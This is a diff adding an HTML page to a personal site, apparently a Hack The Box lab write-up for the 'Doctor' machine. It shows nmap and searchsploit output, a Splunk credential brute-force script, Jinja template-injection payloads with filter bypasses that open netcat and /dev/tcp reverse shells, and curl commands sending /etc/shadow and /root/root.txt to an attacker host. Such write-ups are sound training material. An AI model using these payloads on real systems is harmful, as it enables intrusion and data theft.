@@ -1,0 +1,315 @@
+<!DOCTYPE HTML>
+
+<html>
+
+	<head>
+		<title>Portfolio</title>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+		<link rel="stylesheet" href="/assets/css/main.css"/>
+    	<link rel="stylesheet" href="/assets/css/atom-one-light.css">
+		<noscript><link rel="stylesheet" href="/assets/css/noscript.css" /></noscript>
+	</head>
+
+	<div class="sidebar">
+		<ul class="sidebar-list">
+			<li class="sidebar-item"><a href="/" class="sidebar-anchor">Home</a></li>
+			<li class="sidebar-item"><a href="/HackTheBoxNAVPAGE.html" class="sidebar-anchor">Hack The Box</a></li>
+			<li class="sidebar-item"><a href="/Vulnhub.html" class="sidebar-anchor">Vuln Hub</a></li>
+			<li class="sidebar-item"><a href="#" class="sidebar-anchor">Write-ups</a></li>
+		</ul>
+	  </div>
+
+<main>
+	<body class="is-preload">
+		<!-- Header -->
+			<section id="header">
+				<header>
+					<h1>Doctor</h1>
+					<p>A Hack The Box machine</p>
+
+			<!--SIDE NAV BAR-->
+			<div class="nav-right visible-xs">
+				<div class="button2" id="btn">
+				  <div class="bar top"></div>
+				  <div class="bar middle"></div>
+				  <div class="bar bottom"></div>
+				</div>
+			  </div>
+			  
+			 
+			  <!-- nav-right -->
+			  
+				<nav>
+				  <div class="nav-right hidden-xs">
+					<div class="button2" id="btn">
+					  <div class="bar top"></div>
+					  <div class="bar middle"></div>
+					  <div class="bar bottom"></div>
+					</div>
+				  </div>
+				  <!-- nav-right -->
+				</nav>
+			  
+				</header>
+
+			</section>
+	
+
+			<!--Search Box-->
+            <form1 id="test">
+				<input type="text" name="input" class="input1" id="search-input">
+				<button1 type="reset" class="search1" id="search-btn"></button1>
+			</form1>
+
+			<article class="container box style3 ">
+
+                <div id="content">
+                    
+                    <h1 id="doctor">Doctor</h1>
+                    <h3 id="nmap">NMAP</h3>
+                    
+                    <div class="text">
+                    <p> Perform NMAP scan on IP address </p>
+                    </div>
+                    
+                    <pre><code class=" bash lang- bash language- bash">root@kali:~/Downloads/hackthebox/doctor# cat nmap.txt 
+                    # Nmap 7.80 scan initiated Tue Nov 10 12:20:42 2020 as: nmap -Pn -sV -p- -oN nmap.txt 10.10.10.209
+                    Nmap scan report for 10.10.10.209
+                    Host is up (0.11s latency).
+                    Not shown: 65532 filtered ports
+                    PORT     STATE SERVICE  VERSION
+                    22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+                    80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
+                    8089/tcp open  ssl/http Splunkd httpd
+                    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+                    </code></pre>
+                    
+                    <div class="text">
+                    <p>Looks like its running a web server on port 80. Lets have a look to see if there is anything we
+                      can find here. </p>
+                    
+                   <p> Apache version looks up to date (no exploit here) but might be something of interest in web 
+                    page. </p>
+                    
+                    <p>Searchsploit reveals authenticated splunk RCE.</p>
+                    
+                    <blockquote>
+                      <p>Splunk RCE requires creds if not using default creds</p>
+                    </blockquote><br />
+
+                    <p>SSH looks up to date (nothing here)</p>
+                    
+                    </div>
+
+                    <pre><code class=" bash lang- bash language- bash">root@kali:~/Downloads/hackthebox/doctor# searchsploit  splunk
+                    ----------------------------------------------------- ---------------------------------
+                     Exploit Title                                       |  Path
+                    ----------------------------------------------------- ---------------------------------
+                    Splunk - Remote Command Execution                    | multiple/remote/18245.py
+                    Splunk 4.1.6 - 'segment' Cross-Site Scripting        | multiple/remote/36246.txt
+                    Splunk 4.1.6 Web Component - Remote Denial of Servic | multiple/dos/36247.txt
+                    Splunk 4.3.1 - Denial of Service                     | multiple/dos/38038.txt
+                    Splunk 4.3.3 - Arbitrary File Read                   | multiple/webapps/21053.txt
+                    Splunk 5.0 - Custom App Remote Code Execution (Metas | multiple/remote/23224.rb
+                    Splunk 6.1.1 - 'Referer' Header Cross-Site Scripting | php/webapps/40997.txt
+                    Splunk < 7.0.1 - Information Disclosure              | linux/webapps/44865.txt
+                    Splunk Enterprise - Information Disclosure           | multiple/webapps/41779.txt
+                    Splunk Enterprise 6.4.3 - Server-Side Request Forger | multiple/webapps/40895.py
+                    Splunk Enterprise 7.2.3 - (Authenticated) Custom App | windows/webapps/46238.py
+                    Splunk Enterprise 7.2.4 - Custom App Remote Command  | windows/webapps/46487.py
+                    ----------------------------------------------------- ---------------------------------
+                    Shellcodes: No Results
+                    
+                    </code></pre><br />
+                    
+                    <h2 id="notes">Notes</h2>
+                    
+                    <div class="text">
+                    <p>So what do we know so far:</p>
+
+                    <li>The box is running splunk Universal Forwarder on port 8089</li>
+                    <li>By default remote authentication with default credentials is not allowed. However, 
+                      if the username or password is changed and we know it then we can authenticate remotely.</li>
+                    <li>I could write custom bash script to essentially bruteforce the creds by executing the 
+                      payload and iterating the password each time untill the correct password is found.</li>
+                    </ul>
+                    </div>
+
+                    <pre><code class="bash lang-bash language-bash">#!/bin/bash
+                    
+                    username=Admin
+                    
+                    <span class="tag">------------Handles</span> Flag Arguments--------
+                    while getopts w:s:h:p:l: flag
+                    do
+                        case "${flag}" in
+                            w) wordlist=${OPTARG};;
+                            s) script=${OPTARG};;
+                            p) port=${OPTARG};;
+                            h) host=${OPTARG};;
+                            l) localhost=${OPTARG};;
+                            <span class="tag">h</span>) help=${OPTARG};;
+                        esac
+                    done
+                    
+                    
+                    <span class="tag">------------Check</span> for arguments----------
+                    if [ "$#" -lt 5 ]
+                      then
+                        echo "
+                                                        [-p Port]
+                                                        [-l Local host]
+                                                        [-h Remote host]
+                                                        [-s Script]
+                                                        [-w Password List]"
+                    fi
+                    
+                    <span class="tag">------------Read</span> Word List-----------------
+                    while read line;
+                    do
+                            <span class="tag">echo</span> "Trying Username:$username Password:$line"
+                            python $script --host $host --port $port --username $username --password $line --lhost $localhost --payload 'curl -F "data=@/etc/shadow" http://LocalIP:Port'                                                
+                    
+                    done < $wordlist
+                    </code></pre>
+                    
+                <div class="text">
+
+                    <p>So this script didn't work. </p>
+                    
+                    <p>The webpage shows an email addres info@doctors.htb. This gives us a domain we can point 
+                      to. So I can update /etc/hosts to point to the domain which brings us to a login page </p>
+                    
+                    <p> We can register an account and post messages. So potentially some SQL injection or XSS? </p>
+                    
+                    <p> I Found a /archive page with dirbuster which has nothing on it, seems suspicious to me.
+                    I tried some simple template injection payloads "{7*7}" since xss injection was partially working. 
+                    Doing this returned 49 in /archive source code -  this tells me it is executing code. </p>
+                    
+                    <p>We know now we have a template injection vulnerability. Fuzzing allows me to figure out 
+                      this is jinja and not Smarty etc. </p>
+                    </div>
+                    
+                    <h2 id="jina-template-injection">Jina Template Injection</h2>
+                    
+                    <div class="text">
+                    <p>Some great information on fuzzing template injection vulnerabilities can be found 
+                      <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md"> here. </a> </p>
+                    </div>
+                    <pre><code class="js lang-js language-js">{{request.application.__globals__.__builtins__.__import__('os').popen('nc -e /bin/bash 10.10.14.162 1234').read()}}</code></pre>
+                    <br />
+                    <pre><code class="js lang-js language-js">{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}</code></pre>
+                    
+                    <div class="text">
+                    
+                    <p> I tried these but they didn't work. Which made me think there was some sort of WAF or input 
+                      sanitisation preventing me from executing code. </p>
+                    </div>
+                    
+                    <pre><code class="js lang-js language-js"># evil config
+                    {{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} 
+                    # load the evil config
+                    {{ config.from_pyfile('/tmp/evilconfig.cfg') }}  
+                    # connect to evil host
+                    {{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.162/1234 0>&1"',shell=True) }}
+                    </code></pre>
+                    
+                    <div class="text">
+                      
+                    <p>This might have worked but this filter stopped it</p>
+                    <p>I used burpsuit to send requests with the typical "illegal" characters to get an idea of the 
+                      filter inplace.</p>
+                      
+                    <p> This was what was being filtered | . _ ' "> </p>
+                       
+                    </div>
+                    
+                    <pre> <code class="js lang-js language-js">{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}</code></pre>
+                    <br />
+
+                    <div class="text">
+                    <p>This command worked</p>
+                    <p> After some enumeration i found multiple versions of nc to get reverse shell </p>
+                    
+                    <p> The nc reverse shell did not work but I found nc.openbsd. I had not heard of this version before but a great github
+                      page explained all the different ways to get a reverse shell with different nc versions. That can be found 
+                    <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nc"> here.</a></p>
+                    </div>
+
+                    <pre><code class="js lang-js language-js"> {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('/usr/bin/nc.openbsd rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>1|nc 10.10.14.98 1234 /tmp/f')|attr('read')()}} </code> </pre>
+                    
+                    <div class="text">
+                    <p>Boom. Got reverse shell from paylaod</p>
+                    
+                    <p>I ran Linpeas and linux exploit suggester which did not return anything for priviledge escalation tactics. As well as this
+                    sudo -L returned nothing.</p>
+                    
+                    <p> What about earlier I saw that splunk port was open. This is running as root so if i am
+                    able to get creds then i can privilege escalate.
+                    </p>
+                    
+                    <br />
+                    <blockquote>
+                      enumeration found a backup file which is not normally found in apache2 directory - a quick grep of the file found a juicy password
+                    </blockquote><br />
+                      
+                    <p> Using su i switched to the Shaun user to test the password i found which worked!! </p>
+                    </div>
+
+                      <pre> <code class="bash">www@doctor: cat /var/log/apache2/backup | grep password </code></pre><br />
+                      
+                    
+                    <pre><code class="bash"> 10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"</code></pre>
+                    
+                    <div class="text">
+                    <p>Splunk RCE for priviledge escalation 
+                    Splunk is running at root so can access /root directory</p>
+                </div>
+
+                    <pre> <code class="bash">root@kali: python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --lhost 10.10.15.26  --username shaun --password Guitar123 --payload "curl -F 'data=@/root/root.txt' http://10.10.15.26:1234"</code></pre>
+
+                    </div>
+                    
+
+
+			</article>
+
+		
+
+		<section id="footer">
+			<ul class="icons">
+				<li><a href="#" class="icon brands fa-twitter"><span class="label">Twitter</span></a></li>
+				<li><a href="#" class="icon brands fa-facebook-f"><span class="label">Facebook</span></a></li>
+				<li><a href="#" class="icon brands fa-google-plus-g"><span class="label">Google+</span></a></li>
+				<li><a href="#" class="icon brands fa-pinterest"><span class="label">Pinterest</span></a></li>
+				<li><a href="#" class="icon brands fa-dribbble"><span class="label">Dribbble</span></a></li>
+				<li><a href="#" class="icon brands fa-linkedin-in"><span class="label">LinkedIn</span></a></li>
+			</ul>
+			<div class="copyright">
+				<ul class="menu">
+					<li>&copy; </a></li>
+				</ul>
+			</div>
+		</section>
+
+		<!-- Scripts -->
+		<script src="/assets/js/jquery.min.js"></script>
+		<script src="/assets/js/jquery.scrolly.min.js"></script>
+		<script src="/assets/js/jquery.poptrox.min.js"></script>
+		<script src="/assets/js/browser.min.js"></script>
+		<script src="/assets/js/breakpoints.min.js"></script>
+		<script src="/assets/js/util.js"></script>
+		<script src="/assets/js/main.js"></script>
+ 		<script src="/assets/js/button.js"></script>
+		<script src="/assets/js/NavBar.js"></script>
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.2/jquery.min.js"></script>
+  		<script src="/assets/js/highlight.pack.js"></script>
+  		<script>hljs.initHighlightingOnLoad();</script>
+	
+
+
+	</body>
+    <br />
+</main>
+</html>
